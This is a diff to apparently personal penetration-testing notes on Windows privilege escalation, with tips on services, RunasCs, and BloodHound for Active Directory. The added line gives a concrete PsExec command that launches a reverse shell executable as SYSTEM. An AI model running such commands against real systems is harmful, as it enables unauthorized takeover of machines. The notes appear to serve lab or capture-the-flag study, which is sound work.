@@ -48,7 +48,7 @@
 - Check the arch of shell process, some PE vectors can only be performed on 64 bits shell
 - Check for which services user can start https://0xdf.gitlab.io/2020/04/25/htb-control.html, Ippsec has good video about services in Control box
 - Runas improved https://github.com/antonioCoco/RunasCs
-- Escalate to SYSTEM from admin: psexec the reverse shell executable
+- Escalate to SYSTEM from admin: psexec the reverse shell executable: `PsExec64.exe -i -accepteula -d -s C:\BypassUAC\reverse_3333.exe`
 
 ## Active Directory
 - Use BloodHound and SharpHound to gather information about AD, mark some users as Owned then use "Shortest Path from Owned Principals".
